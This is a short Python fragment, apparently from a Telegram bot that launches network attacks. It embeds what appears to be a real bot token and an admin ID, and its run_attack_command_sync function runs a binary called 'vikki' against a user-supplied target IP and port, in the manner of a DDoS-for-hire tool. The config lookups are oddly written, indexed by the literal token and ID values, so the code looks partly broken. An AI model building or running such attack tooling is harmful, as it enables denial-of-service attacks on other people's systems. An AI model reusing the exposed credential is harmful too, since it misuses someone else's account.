...
BOT_TOKEN = config['7581183368:AAGfiatjlMKpxkqk50-u0dpX9G3CWeQXbEA']
ADMIN_IDS = config['427131029']
...
def run_attack_command_sync(target_ip, target_port, action):
    if action == 1:
        process = subprocess.Popen(["./vikki", target_ip, str(target_port), "1"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
